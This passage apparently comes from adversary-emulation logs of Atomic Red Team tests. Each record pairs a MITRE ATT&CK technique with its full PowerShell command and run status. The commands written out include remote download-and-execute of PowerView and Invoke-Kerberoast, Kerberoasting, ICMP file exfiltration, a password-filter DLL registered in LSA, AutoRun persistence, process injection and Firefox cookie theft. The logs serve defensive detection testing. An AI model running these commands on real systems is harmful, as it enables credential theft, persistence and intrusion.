                      '/E:Jscript "C:\\ProgramData\\Microsoft\\Windows\\Start '
                      'Menu\\Programs\\StartUp\\jsestartup.jse"',
 'platform': 'windows',
 'run': '2023-12-02T03:44:54Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1218_004__defense-evasion__signed_binary_proxy_execution-_installutil__48dc8d6cce12ca22b19fdbc93bd3a9ed__trial_1

atomic_ordering: ['48dc8d6cce12ca22b19fdbc93bd3a9ed']
------------------------------
{'ability_id': '48dc8d6cce12ca22b19fdbc93bd3a9ed',
 'agent_reported_time': '2023-11-11T13:10:51Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1218.004',
            'technique_name': 'Signed Binary Proxy Execution: InstallUtil'},
 'command': 'if (Test-Path "eaecbe_InstallUtilTestHarness.ps1") { ; } else '
            '{New-Item -Type Directory (split-path '
            '"eaecbe_InstallUtilTestHarness.ps1") -ErrorAction ignore | '
            'Out-Null; Invoke-WebRequest '
            "'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' "
            '-OutFile "eaecbe_InstallUtilTestHarness.ps1"};  ; . '
            '"eaecbe_InstallUtilTestHarness.ps1"; $InstallerAssemblyDir = '
            '"$Env:TEMP\\"; $InstallerAssemblyFileName = "T1218.004.dll"; '
            '$InstallerAssemblyFullPath = Join-Path -Path '
            '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; '
            '$CommandLine = "/logfile= /logtoconsole=false '
            '`"$InstallerAssemblyFullPath`""; $ExpectedOutput = '
            "'Constructor_'; $TestArgs = @{;     OutputAssemblyDirectory = "
            '$InstallerAssemblyDir;     OutputAssemblyFileName = '
            '$InstallerAssemblyFileName;     InvocationMethod = '
            "'InstallHelper';     CommandLine = $CommandLine; }; $ActualOutput "
            '= Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs '
            '-MinimumViableAssembly; if ($ActualOutput -ne $ExpectedOutput) '
            '{;     throw @"; InstallHelper method execution test failure. '
            'Installer assembly execution output did not match the expected '
            'output.; Expected: $ExpectedOutput; Actual: $ActualOutput; "@; }',
 'delegated': '2023-11-30T20:11:48Z',
 'description': 'Executes the InstallHelper class constructor runner instead '
                'of executing InstallUtil. Upon execution, no output will be '
                'displayed if the test\n'
                'executed successfuly.\n',
 'executor': 'psh',
 'link_id': '9ddedbec-41ad-4760-8beb-09605c96253b',
 'name': 'InstallHelper method call',
 'pid': 6464,
 'plaintext_command': 'if (Test-Path "eaecbe_InstallUtilTestHarness.ps1") { ; '
                      '} else {New-Item -Type Directory (split-path '
                      '"eaecbe_InstallUtilTestHarness.ps1") -ErrorAction '
                      'ignore | Out-Null; Invoke-WebRequest '
                      "'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' "
                      '-OutFile "eaecbe_InstallUtilTestHarness.ps1"};  ; . '
                      '"eaecbe_InstallUtilTestHarness.ps1"; '
                      '$InstallerAssemblyDir = "$Env:TEMP\\"; '
                      '$InstallerAssemblyFileName = "T1218.004.dll"; '
                      '$InstallerAssemblyFullPath = Join-Path -Path '
                      '$InstallerAssemblyDir -ChildPath '
                      '$InstallerAssemblyFileName; $CommandLine = "/logfile= '
                      '/logtoconsole=false `"$InstallerAssemblyFullPath`""; '
                      "$ExpectedOutput = 'Constructor_'; $TestArgs = @{;     "
                      'OutputAssemblyDirectory = $InstallerAssemblyDir;     '
                      'OutputAssemblyFileName = '
                      '$InstallerAssemblyFileName;     InvocationMethod = '
                      "'InstallHelper';     CommandLine = $CommandLine; }; "
                      '$ActualOutput = '
                      'Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs '
                      '-MinimumViableAssembly; if ($ActualOutput -ne '
                      '$ExpectedOutput) {;     throw @"; InstallHelper method '
                      'execution test failure. Installer assembly execution '
                      'output did not match the expected output.; Expected: '
                      '$ExpectedOutput; Actual: $ActualOutput; "@; }',
 'platform': 'windows',
 'run': '2023-11-30T20:12:45Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1558_003__credential-access__steal_or_forge_kerberos_tickets-_kerberoasting__8b5f748da9647a4d9c5a37f20124ba9c__trial_1

atomic_ordering: ['8b5f748da9647a4d9c5a37f20124ba9c']
------------------------------
{'ability_id': '8b5f748da9647a4d9c5a37f20124ba9c',
 'agent_reported_time': '2023-11-11T13:10:03Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1558.003',
            'technique_name': 'Steal or Forge Kerberos Tickets: Kerberoasting'},
 'command': 'if((Get-CIMInstance -Class Win32_ComputerSystem) { ; } else '
            '{Write-Host Joining this computer to a domain must be done '
            'manually};  ;  [Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; iex(iwr '
            'https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 '
            '-UseBasicParsing); Invoke-Kerberoast | fl',
 'delegated': '2023-12-03T06:21:36Z',
 'description': 'This test uses the Powershell Empire Module: '
                'Invoke-Kerberoast.ps1\n'
                'The following are further sources and credits for this '
                'attack:\n'
                '[Kerberoasting Without Mimikatz source] '
                '(https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)\n'
                '[Invoke-Kerberoast source] '
                '(https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)\n'
                'when executed successfully , the test displays available '
                'services with their hashes. \n'
                "If the testing domain doesn't have any service principal name "
                'configured, there is no output\n',
 'executor': 'psh',
 'link_id': 'abf804b0-acf1-40d6-b699-47f2d9ad0d5e',
 'name': 'Request for service tickets',
 'pid': 1420,
 'plaintext_command': 'if((Get-CIMInstance -Class Win32_ComputerSystem) { ; } '
                      'else {Write-Host Joining this computer to a domain must '
                      'be done manually};  ;  '
                      '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; iex(iwr '
                      'https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 '
                      '-UseBasicParsing); Invoke-Kerberoast | fl',
 'platform': 'windows',
 'run': '2023-12-03T06:21:43Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1219__command-and-control__remote_access_software__1ce0e92b4cd09129c6d0f3aafb38c600__trial_1

atomic_ordering: ['1ce0e92b4cd09129c6d0f3aafb38c600']
------------------------------
{'ability_id': '1ce0e92b4cd09129c6d0f3aafb38c600',
 'agent_reported_time': '2023-11-11T13:09:55Z',
 'attack': {'tactic': 'command-and-control',
            'technique_id': 'T1219',
            'technique_name': 'Remote Access Software'},
 'command': 'Start-Process $env:ProgramFiles\\Connect\\Connect.exe',
 'delegated': '2023-12-01T04:14:25Z',
 'description': 'An adversary may attempt to trick the user into downloading '
                'MSP360 Connect for use as a C2 channel.\n'
                'Upon successful execution, MSP360 Connect will be executed.\n',
 'executor': 'psh',
 'link_id': '14c4ba4a-70e0-4957-a28d-2ca3618d515d',
 'name': 'MSP360 Connect Execution',
 'pid': 764,
 'plaintext_command': 'Start-Process $env:ProgramFiles\\Connect\\Connect.exe',
 'platform': 'windows',
 'run': '2023-12-01T04:14:35Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1059_001__execution__command_and_scripting_interpreter-_powershell__e2e6f33cf77d10e3c82c244014da20c5__trial_1

atomic_ordering: ['e2e6f33cf77d10e3c82c244014da20c5']
------------------------------
{'ability_id': 'e2e6f33cf77d10e3c82c244014da20c5',
 'agent_reported_time': '2023-11-11T13:10:13Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1059.001',
            'technique_name': 'Command and Scripting Interpreter: PowerShell'},
 'command': 'function nslookup  { &"$env:windir\\system32\\nslookup.exe" @args '
            '| Out-Null; @("","whoami")}; powershell .(nslookup -q=txt '
            'example.com 8.8.8.8)[-1]',
 'delegated': '2023-11-28T08:55:47Z',
 'description': "Red teamer's avoid IEX and Invoke-WebRequest in your "
                'PowerShell commands. Instead, host a text record with a '
                'payload to compromise hosts.\n'
                '[reference](https://twitter.com/jstrosch/status/1237382986557001729)\n',
 'executor': 'psh',
 'link_id': '0672e17e-adb5-437e-a274-86d67cbcea68',
 'name': 'Abuse Nslookup with DNS Records',
 'pid': 9748,
 'plaintext_command': 'function nslookup  { '
                      '&"$env:windir\\system32\\nslookup.exe" @args | '
                      'Out-Null; @("","whoami")}; powershell .(nslookup -q=txt '
                      'example.com 8.8.8.8)[-1]',
 'platform': 'windows',
 'run': '2023-11-28T08:56:07Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1069_002__discovery__permission_groups_discovery-_domain_groups__2594698a8e38a85b0d98468d87b49821__trial_1

atomic_ordering: ['2594698a8e38a85b0d98468d87b49821']
------------------------------
{'ability_id': '2594698a8e38a85b0d98468d87b49821',
 'agent_reported_time': '2023-11-11T13:09:52Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1069.002',
            'technique_name': 'Permission Groups Discovery: Domain Groups'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
            "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' "
            '-UseBasicParsing); Get-DomainGroupMember "Domain Admins"',
 'delegated': '2023-11-28T13:07:26Z',
 'description': 'Utilizing PowerView, run Get-DomainGroupMember to identify '
                'domain users. Upon execution, progress and info about groups '
                'within the domain being scanned will be displayed.\n',
 'executor': 'psh',
 'link_id': '5de5a2b0-c2b2-4e51-9262-b15223fabd26',
 'name': 'Get-DomainGroupMember with PowerView',
 'pid': 2456,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
                      "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' "
                      '-UseBasicParsing); Get-DomainGroupMember "Domain '
                      'Admins"',
 'platform': 'windows',
 'run': '2023-11-28T13:07:46Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1547_006__multiple__boot_or_logon_autostart_execution-_kernel_modules_and_extensions__bdd0be771e2462e572e2ecfbe5bf2eb7__trial_1

atomic_ordering: ['bdd0be771e2462e572e2ecfbe5bf2eb7']
------------------------------
{'ability_id': 'bdd0be771e2462e572e2ecfbe5bf2eb7',
 'agent_reported_time': '2023-11-11T13:09:57Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1547.006',
            'technique_name': 'Boot or Logon Autostart Execution: Kernel '
                              'Modules and Extensions'},
 'command': '$examplePath = Join-Path $env:windir "system32\\Com"; if (-not '
            '(Test-Path $examplePath)) { New-Item -ItemType Directory -Path '
            '$examplePath | Out-Null }; $exampleName = "comadmin.dat"; '
            '$exampleFullPath = Join-Path $examplePath $exampleName; '
            '$randomBytes = New-Object Byte[] 0x1000; (New-Object '
            'Random).NextBytes($randomBytes); '
            '[System.IO.File]::WriteAllBytes($exampleFullPath, $randomBytes)',
 'delegated': '2023-12-02T07:19:19Z',
 'description': 'The following Atomic Test will write an file, comadmin.dat, '
                "to disk. From the report, Snake's installer drops the kernel "
                'driver and a custom DLL which is used to load the driver into '
                'a\n'
                'single AES encrypted file on disk. Typically, this file is '
                'named “comadmin.dat” and is stored in the '
                '%windows%\\system32\\Com directory. \n'
                'This Atomic Test will write a hardcoded named file to disk in '
                'the com directory named comadmin.dat.\n'
                '[Snake Malware - '
                'CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF)  \n',
 'executor': 'psh',
 'link_id': 'de8e82e8-80af-4413-8d3a-eb67017c31cc',
 'name': 'Snake Malware Kernel Driver Comadmin',
 'pid': 10196,
 'plaintext_command': '$examplePath = Join-Path $env:windir "system32\\Com"; '
                      'if (-not (Test-Path $examplePath)) { New-Item -ItemType '
                      'Directory -Path $examplePath | Out-Null }; $exampleName '
                      '= "comadmin.dat"; $exampleFullPath = Join-Path '
                      '$examplePath $exampleName; $randomBytes = New-Object '
                      'Byte[] 0x1000; (New-Object '
                      'Random).NextBytes($randomBytes); '
                      '[System.IO.File]::WriteAllBytes($exampleFullPath, '
                      '$randomBytes)',
 'platform': 'windows',
 'run': '2023-12-02T07:19:22Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1082__discovery__system_information_discovery__e6a9fe7e91030f05ad87b75ad4fd4a3a__trial_1

atomic_ordering: ['e6a9fe7e91030f05ad87b75ad4fd4a3a']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1048_003__exfiltration__exfiltration_over_alternative_protocol-_exfiltration_over_unencrypted,obfuscated_non-c2_protocol__6baab84fe7a52dd5c4ede612fc0d255f__trial_1

atomic_ordering: ['6baab84fe7a52dd5c4ede612fc0d255f']
------------------------------
{'ability_id': '6baab84fe7a52dd5c4ede612fc0d255f',
 'agent_reported_time': '2023-11-11T13:09:23Z',
 'attack': {'tactic': 'exfiltration',
            'technique_id': 'T1048.003',
            'technique_name': 'Exfiltration Over Alternative Protocol: '
                              'Exfiltration Over Unencrypted/Obfuscated Non-C2 '
                              'Protocol'},
 'command': '$ping = New-Object System.Net.Networkinformation.ping; '
            'foreach($Data in Get-Content -Path '
            'C:\\Windows\\System32\\notepad.exe -Encoding Byte -ReadCount '
            '1024) { $ping.Send("127.0.0.1", 1500, $Data) }',
 'delegated': '2023-11-27T20:59:22Z',
 'description': 'Exfiltration of specified file over ICMP protocol.\n'
                '\n'
                'Upon successful execution, powershell will utilize ping '
                '(icmp) to exfiltrate notepad.exe to a remote address (default '
                '127.0.0.1). Results will be via stdout.\n',
 'executor': 'psh',
 'link_id': 'b5ca3ca9-d66c-465d-838e-5bb87415ebef',
 'name': 'Exfiltration Over Alternative Protocol - ICMP',
 'pid': 9876,
 'plaintext_command': '$ping = New-Object System.Net.Networkinformation.ping; '
                      'foreach($Data in Get-Content -Path '
                      'C:\\Windows\\System32\\notepad.exe -Encoding Byte '
                      '-ReadCount 1024) { $ping.Send("127.0.0.1", 1500, $Data) '
                      '}',
 'platform': 'windows',
 'run': '2023-11-27T20:59:36Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1505_005__persistence__server_software_component-_terminal_services_dll__7cd26e24cc23c5a7e1183120fa034f89__trial_1

atomic_ordering: ['7cd26e24cc23c5a7e1183120fa034f89']
------------------------------
{'ability_id': '7cd26e24cc23c5a7e1183120fa034f89',
 'agent_reported_time': '2023-11-11T13:10:11Z',
 'attack': {'tactic': 'persistence',
            'technique_id': 'T1505.005',
            'technique_name': 'Server Software Component: Terminal Services '
                              'DLL'},
 'command': '$ACL = Get-Acl $fileName; $permission = '
            '"Administrators","FullControl","Allow"; $accessRule = New-Object '
            'System.Security.AccessControl.FileSystemAccessRule $permission; '
            '$ACL.SetAccessRule($accessRule); Set-Acl -Path $fileName '
            '-AclObject $ACL; Copy-Item -Path '
            '"C:\\Windows\\System32\\termsrv.dll" -Destination '
            '"C:\\Windows\\System32\\termsrv_backup.dll" -ErrorAction Ignore; '
            'Add-Content -Path "C:\\Windows\\System32\\termsrv.dll" -Value '
            '"`n" -NoNewline -ErrorAction Ignore; Move-Item -Path '
            '"C:\\Windows\\System32\\termsrv_backup.dll" -Destination '
            '"C:\\Windows\\System32\\termsrv.dll" -Force -ErrorAction Ignore',
 'delegated': '2023-12-01T12:39:51Z',
 'description': 'Simulates patching of termsrv.dll by making a benign change '
                'to the file and replacing it with the original afterwards.\n'
                'Before we can make the modifications we need to take '
                'ownership of the file and grant ourselves the necessary '
                'permissions.\n',
 'executor': 'psh',
 'link_id': 'bec190dd-70a7-4ed2-95eb-a5f87cda8dde',
 'name': 'Simulate Patching termsrv.dll',
 'pid': 8224,
 'plaintext_command': '$ACL = Get-Acl $fileName; $permission = '
                      '"Administrators","FullControl","Allow"; $accessRule = '
                      'New-Object '
                      'System.Security.AccessControl.FileSystemAccessRule '
                      '$permission; $ACL.SetAccessRule($accessRule); Set-Acl '
                      '-Path $fileName -AclObject $ACL; Copy-Item -Path '
                      '"C:\\Windows\\System32\\termsrv.dll" -Destination '
                      '"C:\\Windows\\System32\\termsrv_backup.dll" '
                      '-ErrorAction Ignore; Add-Content -Path '
                      '"C:\\Windows\\System32\\termsrv.dll" -Value "`n" '
                      '-NoNewline -ErrorAction Ignore; Move-Item -Path '
                      '"C:\\Windows\\System32\\termsrv_backup.dll" '
                      '-Destination "C:\\Windows\\System32\\termsrv.dll" '
                      '-Force -ErrorAction Ignore',
 'platform': 'windows',
 'run': '2023-12-01T12:40:10Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1218_007__defense-evasion__signed_binary_proxy_execution-_msiexec__c905c33c06f38484cab101ae93a93a9a__trial_1

atomic_ordering: ['c905c33c06f38484cab101ae93a93a9a']
------------------------------
{'ability_id': 'c905c33c06f38484cab101ae93a93a9a',
 'agent_reported_time': '2023-11-11T13:09:54Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1218.007',
            'technique_name': 'Signed Binary Proxy Execution: Msiexec'},
 'command': 'Invoke-CimMethod -ClassName Win32_Product -MethodName',
 'delegated': '2023-12-01T01:20:43Z',
 'description': 'Executes an MSI containing an embedded EXE using the WMI '
                'Win32_Product class\n',
 'executor': 'psh',
 'link_id': '017a23d5-f5da-4e21-bc62-56734b3264b4',
 'name': 'WMI Win32_Product Class - Execute Local MSI file with an embedded '
         'EXE',
 'pid': 764,
 'plaintext_command': 'Invoke-CimMethod -ClassName Win32_Product -MethodName',
 'platform': 'windows',
 'run': '2023-12-01T01:20:55Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1069_002__discovery__permission_groups_discovery-_domain_groups__57781057e51ffecf21e38fd31c9d2f79__trial_1

atomic_ordering: ['57781057e51ffecf21e38fd31c9d2f79']
------------------------------
{'ability_id': '57781057e51ffecf21e38fd31c9d2f79',
 'agent_reported_time': '2023-11-11T13:09:48Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1069.002',
            'technique_name': 'Permission Groups Discovery: Domain Groups'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
            "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' "
            '-UseBasicParsing); Get-DomainGroup -verbose',
 'delegated': '2023-11-28T14:04:52Z',
 'description': 'Utilizing PowerView, run Get-DomainGroup to identify the '
                'domain groups. Upon execution, Groups within the domain will '
                'be listed.\n',
 'executor': 'psh',
 'link_id': 'd9c6a395-ca40-4a3f-961d-61f0d1075964',
 'name': 'Get-DomainGroup with PowerView',
 'pid': 4532,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
                      "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' "
                      '-UseBasicParsing); Get-DomainGroup -verbose',
 'platform': 'windows',
 'run': '2023-11-28T14:05:16Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1518_001__discovery__software_discovery-_security_software_discovery__e922717a38fc8806bc9b56b111b999ff__trial_1

atomic_ordering: ['e922717a38fc8806bc9b56b111b999ff']
------------------------------
{'ability_id': 'e922717a38fc8806bc9b56b111b999ff',
 'agent_reported_time': '2023-11-11T13:10:19Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1518.001',
            'technique_name': 'Software Discovery: Security Software '
                              'Discovery'},
 'command': 'get-process | ?{$_.Description -like "*virus*"}; get-process | '
            '?{$_.Description -like "*carbonblack*"}; get-process | '
            '?{$_.Description -like "*defender*"}; get-process | '
            '?{$_.Description -like "*cylance*"}; get-process | '
            '?{$_.Description -like "*mc*"}; get-process | ?{$_.ProcessName '
            '-like "*mc*"}; get-process | Where-Object { $_.ProcessName -eq '
            '"Sysmon" }',
 'delegated': '2023-12-01T13:38:03Z',
 'description': 'Methods to identify Security Software on an endpoint\n'
                '\n'
                'when sucessfully executed, powershell is going to processes '
                'related AV products if they are running.\n'
                'Note that, depending on the privilege of current user, '
                'get-process | ?{$_.Description -like "*"} may not return the '
                'processes related to AV products of the check.\n'
                'For instance, only with Administrator right, you can see the '
                'process description of McAffee processes. Hence, it is better '
                'to use get-process | ?{$_.ProcessName -like "*"},\n'
                'if you know the name of those processes.\n',
 'executor': 'psh',
 'link_id': 'ad255b05-9c16-4ad6-9009-6a1094e658f0',
 'name': 'Security Software Discovery - powershell',
 'pid': 2184,
 'plaintext_command': 'get-process | ?{$_.Description -like "*virus*"}; '
                      'get-process | ?{$_.Description -like "*carbonblack*"}; '
                      'get-process | ?{$_.Description -like "*defender*"}; '
                      'get-process | ?{$_.Description -like "*cylance*"}; '
                      'get-process | ?{$_.Description -like "*mc*"}; '
                      'get-process | ?{$_.ProcessName -like "*mc*"}; '
                      'get-process | Where-Object { $_.ProcessName -eq '
                      '"Sysmon" }',
 'platform': 'windows',
 'run': '2023-12-01T13:38:53Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1615__discovery__group_policy_discovery__38714562d32f33dc32bd7aef553771d9__trial_1

atomic_ordering: ['38714562d32f33dc32bd7aef553771d9']
------------------------------
{'ability_id': '38714562d32f33dc32bd7aef553771d9',
 'agent_reported_time': '2023-11-11T13:10:02Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1615',
            'technique_name': 'Group Policy Discovery'},
 'command': 'powershell -nop -exec bypass -c "IEX (New-Object '
            "Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); "
            'Get-DomainGPO"',
 'delegated': '2023-12-04T03:40:48Z',
 'description': 'Use PowerView to Get-DomainGPO This will only work on Windows '
                '10 Enterprise and A DC Windows 2019.',
 'executor': 'psh',
 'link_id': '839f3dc0-1b84-49fb-ac4f-e7d65724149d',
 'name': 'Get-DomainGPO to display group policy information via PowerView',
 'pid': 4532,
 'plaintext_command': 'powershell -nop -exec bypass -c "IEX (New-Object '
                      "Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); "
                      'Get-DomainGPO"',
 'platform': 'windows',
 'run': '2023-12-04T03:41:18Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1556_002__multiple__modify_authentication_process-_password_filter_dll__cc7f0eb8b9115b271eaaa42c9b6f3dca__trial_1

atomic_ordering: ['cc7f0eb8b9115b271eaaa42c9b6f3dca']
------------------------------
{'ability_id': 'cc7f0eb8b9115b271eaaa42c9b6f3dca',
 'agent_reported_time': '2023-11-11T13:10:12Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1556.002',
            'technique_name': 'Modify Authentication Process: Password Filter '
                              'DLL'},
 'command': 'reg.exe export HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ '
            '"PathToAtomicsFolder\\T1556.002\\lsa_backup.reg"; '
            '$passwordFilterName = (Copy-Item '
            '"PathToAtomicsFolder\\T1556.002\\bin\\AtomicRedTeamPWFilter.dll" '
            '-Destination "C:\\Windows\\System32" -PassThru).basename; $lsaKey '
            '= Get-Item "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\"; '
            '$notificationPackagesValues = $lsaKey.GetValue("Notification '
            'Packages"); $notificationPackagesValues += $passwordFilterName; '
            'Set-ItemProperty '
            '"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\" "Notification '
            'Packages" $notificationPackagesValues',
 'delegated': '2023-12-03T04:05:35Z',
 'description': 'Uses PowerShell to install and register a password filter '
                'DLL. Requires a reboot and administrative privileges.\n'
                'The binary in bin is '
                'https://www.virustotal.com/gui/file/95140c1ad39fd632d1c1300b246293297aa272ce6035eecc3da56e337200221d/detection\n'
                'Source is in src folder. \n'
                'This does require a reboot to see the filter loaded into '
                'lsass.exe. \n'
                'It does require Administrative privileges to import the clean '
                'registry values back into LSA, it is possible you may have to '
                'manually do this after for cleanup.\n',
 'executor': 'psh',
 'link_id': 'f59b4311-2609-4bc4-81fc-9a11ad26882c',
 'name': 'Install and Register Password Filter DLL',
 'pid': 10456,
 'plaintext_command': 'reg.exe export '
                      'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ '
                      '"PathToAtomicsFolder\\T1556.002\\lsa_backup.reg"; '
                      '$passwordFilterName = (Copy-Item '
                      '"PathToAtomicsFolder\\T1556.002\\bin\\AtomicRedTeamPWFilter.dll" '
                      '-Destination "C:\\Windows\\System32" '
                      '-PassThru).basename; $lsaKey = Get-Item '
                      '"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\"; '
                      '$notificationPackagesValues = '
                      '$lsaKey.GetValue("Notification Packages"); '
                      '$notificationPackagesValues += $passwordFilterName; '
                      'Set-ItemProperty '
                      '"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\" '
                      '"Notification Packages" $notificationPackagesValues',
 'platform': 'windows',
 'run': '2023-12-03T04:05:51Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1078_003__multiple__valid_accounts-_local_accounts__fe3527480a77ab0b52a518654e120b72__trial_1

atomic_ordering: ['fe3527480a77ab0b52a518654e120b72']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1546__multiple__event_triggered_execution__50a9be8bbff4d4ffe0b699cb8d040c6d__trial_1

atomic_ordering: ['50a9be8bbff4d4ffe0b699cb8d040c6d']
------------------------------
{'ability_id': '50a9be8bbff4d4ffe0b699cb8d040c6d',
 'agent_reported_time': '2023-11-11T13:10:18Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1546',
            'technique_name': 'Event Triggered Execution'},
 'command': 'New-ItemProperty -Path "HKLM:\\Software\\Microsoft\\Command '
            'Processor" -Name "AutoRun" -Value "notepad.exe" -PropertyType '
            '"String"',
 'delegated': '2023-12-01T23:20:03Z',
 'description': 'An adversary may abuse the CommandProcessor AutoRun registry '
                'key to persist. Every time cmd.exe is executed, the command '
                'defined in the AutoRun key also gets executed.\n'
                '[reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)',
 'executor': 'psh',
 'link_id': 'd90dd967-0007-4060-812d-bd3222ec236a',
 'name': 'HKLM - Persistence using CommandProcessor AutoRun key (With '
         'Elevation)',
 'pid': 2456,
 'plaintext_command': 'New-ItemProperty -Path '
                      '"HKLM:\\Software\\Microsoft\\Command Processor" -Name '
                      '"AutoRun" -Value "notepad.exe" -PropertyType "String"',
 'platform': 'windows',
 'run': '2023-12-01T23:20:29Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1055__multiple__process_injection__ce67d9c1b111032ddb8a56363c854fdc__trial_1

atomic_ordering: ['ce67d9c1b111032ddb8a56363c854fdc']
------------------------------
{'ability_id': 'ce67d9c1b111032ddb8a56363c854fdc',
 'agent_reported_time': '2023-11-11T13:10:32Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1055',
            'technique_name': 'Process Injection'},
 'command': 'Start-Process '
            '"$PathToAtomicsFolder\\T1055\\bin\\x64\\redVanity.exe" '
            '(Start-Process calc.exe -PassThru).Id',
 'delegated': '2023-11-28T03:06:55Z',
 'description': 'This test used the Windows undocumented remote-fork API '
                'RtlCreateProcessReflection to create a cloned process of the '
                'parent process\n'
                'with shellcode written in its memory. The shellcode is '
                'executed after being forked to the child process. The '
                'technique was first presented at \n'
                'BlackHat Europe 2022. Shellcode will open a messsage box and '
                'a notepad.\n',
 'executor': 'psh',
 'link_id': '75c50b37-e5bf-4fc5-95fd-8e041cf98a6e',
 'name': 'Dirty Vanity process Injection',
 'pid': 8224,
 'plaintext_command': 'Start-Process '
                      '"$PathToAtomicsFolder\\T1055\\bin\\x64\\redVanity.exe" '
                      '(Start-Process calc.exe -PassThru).Id',
 'platform': 'windows',
 'run': '2023-11-28T03:07:25Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1539__credential-access__steal_web_session_cookie__d54bcaf2e58f6d95da2a54dcb5853a57__trial_1

atomic_ordering: ['d54bcaf2e58f6d95da2a54dcb5853a57']
------------------------------
{'ability_id': 'd54bcaf2e58f6d95da2a54dcb5853a57',
 'agent_reported_time': '2023-11-11T13:09:54Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1539',
            'technique_name': 'Steal Web Session Cookie'},
 'command': 'stop-process -name "firefox" -force -erroraction '
            'silentlycontinue; $CookieDBLocation = get-childitem -path '
            '"$env:appdata\\Mozilla\\Firefox\\Profiles\\*\\cookies.sqlite"; '
            '"select host, name, value, path, expiry, isSecure, isHttpOnly, '
            'sameSite from [moz_cookies];" | cmd /c '
            'PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite-tools-win32-x86-3380200\\sqlite3.exe '
            '"$CookieDBLocation" | out-file -filepath '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1539FirefoxCookies.txt"',
 'delegated': '2023-12-01T17:49:59Z',
